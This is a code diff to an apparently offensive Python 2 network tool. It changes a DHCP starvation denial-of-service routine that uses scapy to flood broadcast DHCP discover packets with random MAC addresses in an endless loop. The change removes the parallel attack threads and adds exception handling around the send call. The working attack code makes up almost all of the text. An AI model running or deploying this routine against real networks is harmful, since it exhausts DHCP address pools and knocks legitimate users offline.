@@ -277,10 +277,6 @@ class Jam(object):
         def dhcpstarvationstart(self):
                 try:
                         print "[+] DHCP starvation denial of service initialized."
-                        for x in range(0,3):
-                                i = threading.Thread(name='dhcpstarvation', target=self.dhcpstarvation)
-                                i.setDaemon(True)
-                                i.start()
                         self.dhcpstarvation()
                 except Exception as e:
                         print "[!] Exception caught: {}".format(e)
@@ -291,7 +287,10 @@ class Jam(object):
 		try:
 			conf.checkIPaddr = False
 			dhcp_discover =  Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=RandString(12,'0123456789abcdef'))/DHCP(options=[("message-type","discover"),"end"])
-			sendp(dhcp_discover, loop=1, inter=0.0, verbose=False)
+			try:
+				sendp(dhcp_discover, loop=1, inter=0.0, verbose=False)
+			except Exception as e:
+				print "[!] Exception caught: {}".format(e)
                         print "[-] DHCP starvation denial of service finalized."
 			exit(0)
 		except Exception as e:
